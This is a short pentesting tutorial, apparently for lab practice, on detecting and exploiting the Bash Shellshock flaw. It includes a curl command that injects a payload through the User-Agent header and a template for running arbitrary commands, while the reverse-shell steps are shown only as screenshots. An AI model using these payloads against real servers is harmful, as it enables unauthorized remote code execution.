# Shellshock (CVE-2014-6271).
Shellshock is a security vulnerability in the Bash shell, discovered in 2014, that allows attackers to execute arbitrary commands on a vulnerable system. 
It exploits the way Bash handles environment variables and functions. By injecting malicious code into these variables, an attacker can gain control of the system, 
execute commands, or bypass security restrictions, making it a serious risk for servers and devices running vulnerable versions of Bash.



[Pentesterlab](https://pentesterlab.com/exercises/cve-2014-6271)


## Detection.
Shellshock can be exploited regularly in `.sh` or `.cgi` files, we can add those extensions to search them in our fuzzing.


<p align="center">
  <img src="https://github.com/user-attachments/assets/c345d0f0-18c2-4540-b2a3-85e0c34000d0" width="700">
  <img src="https://github.com/user-attachments/assets/cebb8533-3432-4f04-a13b-440ceedd163c" width="700">
  <img src="https://github.com/user-attachments/assets/960f5556-2552-4183-9cdb-bbfda6d0d8d0" width="700">
</p>



<br />

> Shellshock payloads allways begin with: ``() { :;};``.

 ### curl.

<br />
Once we think we have found this vulnerability we can send the next `curl` to the server and check if it answers back. If it does we are against a shellshock vulnerability.

```bash 
curl -H ‘User-Agent: () { :;}; echo; echo ¿Es vulnerable?’ ‘http://10.10.10.56/cgi-bin/user.sh’
```

![3](https://github.com/user-attachments/assets/6c0b21d6-0bd6-42b6-b521-ac1d2da3f7a0)

> We can use Burpsuite too.

![4](https://github.com/user-attachments/assets/a81d1633-5f1d-4890-8823-e02daf1e26de)

## RCE.
Once we know are facing Shellshock we can try to excute commands in the target. To de so we will deploy our commands as follows:
```bash
User-Agent: () { :;}; /bin/bash -c "<COMMAND>"
```
### ping
![5](https://github.com/user-attachments/assets/919c41be-6fa8-4434-9da8-312406cee5f3)
### wget
![6](https://github.com/user-attachments/assets/d5026f68-17dd-4653-aa11-cb0fcfc2ba66)
## Reverse Shell.
![7](https://github.com/user-attachments/assets/1fbb699f-7a81-4930-b397-ec00252ab454)
![8](https://github.com/user-attachments/assets/e998e129-99ff-4039-a2bc-1119bb73b80c)

Any of the headers of the request can be used to deploy our payload as you can see in the following pictures:
![10](https://github.com/user-attachments/assets/95cec147-4243-4843-bc07-087fa42bfdf1)
![11](https://github.com/user-attachments/assets/ab9d9ce1-c41f-44b7-ac8e-0c44cf1fae25)









